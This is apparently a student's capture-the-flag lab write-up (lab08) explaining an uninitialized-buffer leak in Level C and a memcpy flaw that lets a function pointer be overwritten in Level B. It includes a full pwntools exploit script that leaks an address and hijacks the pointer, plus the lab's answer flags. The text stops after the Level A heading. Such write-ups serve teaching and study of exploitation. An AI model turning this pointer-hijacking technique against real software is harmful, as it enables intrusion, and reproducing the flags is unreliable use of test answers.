## lab08

**Level C**
The program will check the size of a file descriptor. However, if this fd is read after checking, it is able to leak the struct information by providing an input exceeds 255 bytes.

Two `strcpy` use the same buffer without initialization, hence the remain content in `fileContent1` is also copied into `fileContent2` (corrupted).

![flagc](08c1.png)

Flag is `3v3ryth1ng_Is_@_F1l3`.

---

**Level B**
The vulnerability lies on the `fave()` function, where memory copy is wrongly handled so that `v3` cannot copied to global `faves` array in a right manner.

```cpp
memcpy(faves[i], (int*)(&v3)+i, sizeof(struct vector));
```

`faves[i]` is a function pointer, so we can change it by giving intended input. This depends on the struct layout of `struct vector`. So I firstly give a probing vector to the input and check the memory layout:

```python
prob_vec = (chr(0x41), 0x4242, 0x4343, 0x44444444, 0x45454545, 0x46464646, 0x47474747, 0x4848484848484848, 0x4949494949494949)
```
![struct](08b1.png)

The `unsigned int` is 4 words apart from the start address, hence we can copy a pointer hidden in `v3.e //(unsined int)` to `faves[4].printFunc`.

`v3` can only be sumed by `v1` and `v2`, and both of them cannot contain 0 value. The pointer address is leaked directly in the main selection.

```python
from pwn import *

prob_vec = (chr(0x41), 0x4242, 0x4343, 0x44444444, 0x45454545, 0x46464646, 0x47474747, 0x4848484848484848, 0x4949494949494949)
one_vec = (chr(1), 1, 1, 1, 1, 1, 1, 1, 1)

p = process('./lab8B')

def send_data(sel, proc, vec):
    proc.sendline('1')
    proc.sendline(str(sel))
    for i in vec:
        proc.sendline(str(i))

def leak_addr(sel, proc):
    proc.sendline('3')
    proc.sendline(str(sel))
    proc.recvregex(r'Address: 0x[0-9a-f]{8}\n')
    ptr = proc.recvregex(r'printFunc: 0x[0-9a-f]{8}\n').strip()
    addr = int(ptr[-10:], 16)
    return addr

def sum_inject_load(proc):
    proc.sendline('2')
    for i in range(5):
        proc.sendline('4')
    proc.sendline('6')
    proc.sendline('4')
    proc.sendline('1')
	p.sendline('3')
	p.sendline('1')

send_data(1, p, one_vec)
printVector_addr = leak_addr(1, p)
thisIsASecret_addr = printVector_addr - (0x10e9 - 0x10a7)

mali_vec = ('q', 0x71, 0x71, 0x71, thisIsASecret_addr-1, 0x71, 0x71, 0x71, 0x71)
send_data(2, p, mali_vec)
sum_inject_load(p)

p.interactive()
```

![flagb](08b2.png)

The flag is `Th@t_w@5_my_f@v0r1t3_ch@11`.

(however, I does not consider the solution avoiding `thisIsASecret` function)

---

**Level A**
The
